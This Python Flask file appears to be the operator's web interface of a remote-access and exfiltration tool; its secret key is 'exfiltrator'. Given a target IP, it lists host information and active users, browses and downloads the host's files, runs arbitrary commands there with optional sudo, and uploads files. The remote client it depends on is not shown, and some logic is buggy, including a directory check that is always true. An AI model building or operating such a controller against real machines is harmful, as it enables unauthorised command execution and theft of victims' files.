#!/usr/bin/python3
from client import client
from flask import Flask, render_template, request, redirect, url_for, flash
from traceback import print_exc
import sys
import ipaddress

app = Flask(__name__)
app.config['SECRET_KEY'] = 'exfiltrator'


@app.route('/host')
def host():
    """ The host page displays the host
    information and active users
    """
    if user.host_info is None:
        user.get_host_data(user.port_1)
        return render_template('host.html', host_info=user.host_info)
    else:
        return render_template('host.html', host_info=user.host_info)


@app.route('/browser', methods=['GET', 'POST'])
def browser(current_path=None):
    """browser page
    The browser page allows our user to
    naviate the file system of the host
    """
    if len(user.root_directory) == 0:
        user.root_directory = user.get_dir(user.port_1)
        return render_template('browser.html', tree=user.root_directory,
                               current_path=user.path)
    if request.method == 'POST':
        selection = request.form['new_path']
        # the file type and name are returned so we
        # must split them and decide if the UI will
        # display the next directory or
        # download the file
        split_selection = selection.split(':')
        if split_selection[0] == 'directory' or 'link' and \
                split_selection[0] != 'file':
            if split_selection[1] == 'root':
                user.root_directory = user.get_dir(user.port_1)
                return render_template('browser.html',
                                       tree=user.root_directory,
                                       current_path=user.path)
            else:
                user.next_directory = user.new_path(
                    user.port_1, split_selection[1])
                return render_template('browser.html',
                                       tree=user.next_directory,
                                       current_path=user.path)
        if split_selection[0] == 'file':
            path_to_file = user.path + '/' + split_selection[1]
            file_to_download = user.download_file(user.port_1, path_to_file)
            with open('saved_files/' + split_selection[1], 'wb') as f:
                f.write(file_to_download)
            return render_template('browser.html',
                                   tree=user.next_directory,
                                   current_path=user.path)

    return render_template('browser.html', tree=user.root_directory)


@app.route('/script_runner', methods=['GET', 'POST'])
def script_runner(stdout=None):
    """script_runner

    this page allows the user to run
    commands on the host with sudo or without
    All commands are run in the background and
    the user is redirected to the script_runner
    """
    if request.method == 'POST':
        command = request.form.get('command')
        arguments = request.form.get('arguments')
        uid = request.form.get('UID')
        with_sudo = request.form.get('sudo')
        true_script = False
        if not command:
            flash('Please enter a command', category='error')
        else:
            true_script = True
        if true_script:
            script = user.build_script(command, arguments, uid, with_sudo)
            user.run_script(user.port_1, script)
            output_list = []
            with open('script_runner.txt', 'r') as f:
                for line in f:
                    output_list.append(line)
            return render_template('script_runner.html',
                                   host_info=user.host_info['active_users'],
                                   stdout=output_list)
    return render_template('script_runner.html',
                           host_info=user.host_info['active_users'])


@app.route('/upload', methods=['GET', 'POST'])
def upload():
    """ Upload page

    This page allows the user to upload a file
    to the host. Currently a .txt file works the
    best but you can also upload other files.
    In this version an exact copy cannot be guaranteed
    """
    if request.method == 'POST':
        file_path = request.form.get('file_path')
        upload_location = request.form.get('upload_location')
        user.upload_file(user.port_1, file_path, upload_location)
    return render_template('upload.html')


@app.route('/', methods=['GET', 'POST'])
def home():
    if request.method == 'POST':
        user.port_1 = user.connect_to_server(user.ipaddr)
        return redirect(url_for('host'))
    else:
        return render_template('home.html')


def main():
    global ipaddr, user
    try:
        ipaddr = sys.argv[1]
        ipaddress.ip_address(ipaddr)
    except ValueError:
        print('Please enter a valid IP address')
        return
    user = client(ipaddr)
    app.run()


if __name__ == '__main__':
    try:
        main()
    except IndexError:
        print("IndexError\nusage: python3 cm.py <ip>")
    except (KeyboardInterrupt, EOFError):
        print("Have a nice day")
    except (SystemExit, GeneratorExit, Exception) as err:
        print_exc()
        pass
